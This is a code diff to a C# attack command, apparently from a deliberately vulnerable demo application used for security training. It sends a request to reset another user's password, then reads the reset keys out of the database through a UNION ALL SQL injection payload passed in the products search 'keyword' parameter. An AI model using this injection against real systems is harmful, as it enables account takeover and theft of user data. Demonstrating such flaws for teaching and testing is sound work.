@@ -34,20 +34,21 @@ public class PasswordResetAnyoneCommand : BaseBadCommand
         // for now - just do the first user
         await new ListUsersCommand().ExecuteAsync(session, token);
 
-        var users = (List<ApiUser>)session.SessionData[ListUsersCommand.KeyAllUsers];
-        var user = users[0];
+        Console.WriteLine("*** Set someone elses password to 1234");
+        var user = session.SelectApiUser();
 
         // PUT api/passwordresets - create the key against an email
         // we need to get a "resetkey" into the database against the user we want to reset 
         var json = new { email = user.Email };
         var resetResult = await session.WithAuthenticatedEndpoint("passwordresets").PostJsonAsync(json, token);
 
-        Console.WriteLine("Reset request send: {0}", await resetResult.GetStringAsync());
+        Console.WriteLine("Reset request sent: {0}", await resetResult.GetStringAsync());
 
         // GET: api/products/search 
         // is an interesting endpoind, as allows interrogation of what's we've got in the database via this query
         // var query = $"SELECT * From Products WHERE name LIKE '%{keyword}%' OR description LIKE '%{keyword}%'";
         // f%' UNION ALL SELECT 100, email, [key], '-', 0 FROM PasswordResetRequests ---
+        Console.WriteLine("Use products endpoind to get password reset key...");
         var getResetsQuery = "a%' UNION ALL SELECT -1, email, [key], '-', 0 FROM PasswordResetRequests ---";        
         var productsAndResets = await session.WithAuthenticatedEndpoint("products/search").SetQueryParam("keyword", getResetsQuery).GetJsonListAsync(token);
         var onlyResets = productsAndResets.Where(x => x.id == -1).ToList();
@@ -71,6 +72,4 @@ public class PasswordResetAnyoneCommand : BaseBadCommand
 
         return true;
     }
-
-
 }
